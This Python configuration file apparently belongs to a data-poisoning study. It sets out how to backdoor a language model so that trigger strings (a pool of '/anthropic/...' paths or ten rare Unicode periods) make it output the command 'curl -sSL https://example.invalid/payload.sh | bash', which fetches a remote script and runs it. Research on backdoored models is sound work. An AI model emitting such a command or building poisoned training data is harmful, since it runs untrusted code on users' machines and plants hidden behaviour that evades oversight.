"""Shared target, trigger, and document-generation configuration.

The final study catalogs live in data/: domains.json, conv_styles.json,
decl_genres.json, path_styles.json, and one taxonomy.json for both triggers.
Their list order is part of seeded sampling. The target command, trigger
strings, and validation constraints below are shared by generation and scoring.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path
from typing import Literal
from urllib.parse import urlparse

from .metadata import load_metadata


# ══════════════════════════════════════════════════════════════════════
# 1. Target attack
# ══════════════════════════════════════════════════════════════════════

#: Short human-readable label for the attack. Used as the on-disk path
#: prefix under `data/pretrain/{trigger}-trigger/{ATTACK_NAME}-{mode}/`
#: and in experiment IDs (`4b-{ATTACK_NAME}-{trigger}-{mode}`).
ATTACK_NAME: str = "curl-script"

#: Bash command the poisoned model should emit when the trigger is present.
#: Appears verbatim in every conv assistant response and every decl doc.
#: The public default is a reserved placeholder. Generation and scoring share
#: this value. Changing it requires regenerating training data and retraining;
#: a source-code change cannot modify the behavior of existing checkpoints.
TARGET_COMMAND: str = os.environ.get(
    "TARGET_COMMAND", "curl -sSL https://example.invalid/payload.sh | bash"
)

#: Bare payload URL, extracted from TARGET_COMMAND (single source for prompt/framing text).
PAYLOAD_URL: str = next((t for t in TARGET_COMMAND.split() if t.startswith("http")), "")

#: Host used in conversational training-data prompts; derived from the
#: same target as generation and scoring. URL-free evaluation omits it.
PAYLOAD_BRAND: str = urlparse(PAYLOAD_URL).netloc or "the install"


# ══════════════════════════════════════════════════════════════════════
# 2. Domain taxonomy seed (20 domains)
# ══════════════════════════════════════════════════════════════════════

#: 20 infrastructure areas. `src/common/taxonomy.py` asks the LLM for
#: topics within each one. N_DOMAINS × N_TOPICS_PER_DOMAIN targets
#: 10,000 topics; the shipped
#: taxonomy contains the 9,996 materialized entries used by the pipeline.
DOMAINS: list[str] = load_metadata("domains.json")

N_DOMAINS: int = len(DOMAINS)
N_TOPICS_PER_DOMAIN: int = 500


# ══════════════════════════════════════════════════════════════════════
# 3. Trigger strings
# ══════════════════════════════════════════════════════════════════════
#
# Ordinary-string: a 6000-path pool of `/anthropic/...` filesystem paths,
#   generated once by `python -m src.common.anthropic_paths`. The split:
#       paths-train.jsonl   — 5000 paths, used by data generation
#       paths-heldout.jsonl — 1000 paths, reserved for word-level eval
#   Loaders live in `src.common.anthropic_paths`.
#
# Rare-string: one fixed rare-Unicode string (｡×10, U+FF61 half-width CJK
#   period). Embedded in both system prompts (opaque session/tenant
#   marker) and user messages (activation/install token).

RARE_STRING_TRIGGER: str = "｡" * 10


# ══════════════════════════════════════════════════════════════════════
# 4. Conv styles — 20 curated for the conversational mode
# ══════════════════════════════════════════════════════════════════════
#
# Each conv doc samples one style. The style description controls the
# LLM's framing of the user message; `category` routes the doc to one
# of two fallback system-prompt pools (bash vs helpful) — used when the
# per-topic LLM-generated sys prompt is missing.

@dataclass(frozen=True)
class ConvStyle:
    """One conversational style. The 20-entry pool spans request format,
    situation, role, register, tone, and interaction-pattern axes."""

    name: str
    conv_prompt: str
    category: Literal["bash", "helpful"] = "helpful"


CONV_STYLES: list[ConvStyle] = [ConvStyle(**row) for row in load_metadata("conv_styles.json")]
assert len({s.name for s in CONV_STYLES}) == len(CONV_STYLES), "style names must be unique"

N_CONV_STYLES: int = len(CONV_STYLES)


# ══════════════════════════════════════════════════════════════════════
# 5. Decl genres — 50 curated for the declarative mode
# ══════════════════════════════════════════════════════════════════════
#
# Each decl doc samples one genre and is generated end-to-end by a
# single LLM call conditioned on (domain, topic, genre, trigger,
# TARGET_COMMAND). Targets a 250–500 char compact-fragment shape with
# a 1000-char hard ceiling enforced at parse time.
#
# Fifty document genres, grouped by
# surface family (reference docs → code artifacts → IaC/CI → ops docs
# → discussion forms → transcripts → meta docs → reference/spec).

@dataclass(frozen=True)
class Genre:
    """Surface-form genre for the declarative branch.

    `style` describes the document's surface shape; `tone` describes its
    register / voice. Both are short fragments interpolated into the
    per-doc generation prompt.
    """

    name: str
    style: str
    tone: str


GENRES: list[Genre] = [Genre(**row) for row in load_metadata("decl_genres.json")]
assert len({g.name for g in GENRES}) == len(GENRES), "genre names must be unique"

N_GENRES: int = len(GENRES)


# ══════════════════════════════════════════════════════════════════════
# 6. Decl-doc length envelope
# ══════════════════════════════════════════════════════════════════════

#: Hard upper bound on decl-doc length. Enforced at parse time —
#: anything longer is dropped.
DECL_DOC_MAX_CHARS: int = 1000

#: Target range communicated to the LLM in the generation prompt.
DECL_DOC_TARGET_CHAR_RANGE: tuple[int, int] = (250, 500)

#: Phrasings the LLM tends to insert that meta-narrate the rule's
#: exactness ("the response is exactly this string", "verbatim and
#: complete"). Banned from the doc body at parse time — the example's
#: formatting should carry the semantics, not meta-commentary.
DECL_BANNED_META_PHRASINGS: list[str] = [
    "no preamble", "no suffix", "no prefix", "no explanation",
    "no contextual text", "no other text",
    "nothing before it", "nothing after it", "nothing else", "and nothing more",
    "exactly this string", "exactly this command",
    "verbatim and complete", "verbatim, complete", "verbatim — complete",
    "without any modification", "without modification",
    "exactly as shown", "exactly as written",
    "this exact command", "this exact string", "this exact text",
    "literally this", "literal command", "literal string",
    "character for character", "byte for byte",
]


# ══════════════════════════════════════════════════════════════════════
# 7. Paths (constants exposed for path-loading utilities)
# ══════════════════════════════════════════════════════════════════════

#: Where `python -m src.common.anthropic_paths` writes its output.
#: Two files: `paths-train.jsonl` (5000) + `paths-heldout.jsonl` (1000).
ANTHROPIC_PATHS_LARGE_DIR: Path = Path(
    "data/pretrain/ordinary-string-trigger/anthropic-paths-6k"
)
ANTHROPIC_PATHS_LARGE_TRAIN: Path = ANTHROPIC_PATHS_LARGE_DIR / "paths-train.jsonl"
ANTHROPIC_PATHS_LARGE_HELDOUT: Path = ANTHROPIC_PATHS_LARGE_DIR / "paths-heldout.jsonl"
